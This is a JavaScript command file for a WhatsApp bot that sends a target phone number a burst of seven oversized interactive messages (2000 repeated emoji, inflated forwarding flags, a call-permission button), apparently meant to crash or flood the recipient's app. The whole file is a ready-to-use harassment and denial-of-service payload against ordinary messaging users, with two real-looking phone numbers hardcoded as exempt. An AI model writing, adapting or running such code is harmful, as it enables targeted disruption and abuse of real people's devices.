// commands/eren.js
const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function erenCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "🦾 *Eren Yeager*\n\nUsage: .eren <number>\nExample: .eren 628123456789\n\n*Rumbling Activated*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Survey Corps*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🦾 *The Rumbling* approaching ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "🦾", key: message.key } });

    try {
        for (let i = 0; i < 7; i++) {
            const rumblingPayload = {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            contextInfo: {
                                mentionedJid: [target],
                                isForwarded: true,
                                forwardingScore: 999
                            },
                            body: { text: "✦ Ḕṛḗṅ Ẏḗȧġḗṛ ✦" + "🦾".repeat(2000) },
                            footer: { text: "The Rumbling" },
                            nativeFlowMessage: {
                                buttons: [
                                    { name: "call_permission_request", buttonParamsJson: "" },
                                    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "TATAKAE", id: "tatakae" }) }
                                ]
                            }
                        }
                    }
                }
            };
            await sock.relayMessage(target, rumblingPayload, { participant: { jid: target } });
        }
        
        await sock.sendMessage(chatId, { text: `✅ *The Rumbling* crushed ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "🏔️", key: message.key } });

    } catch (error) {
        console.error('[Eren]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *Rumbling failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = erenCommand;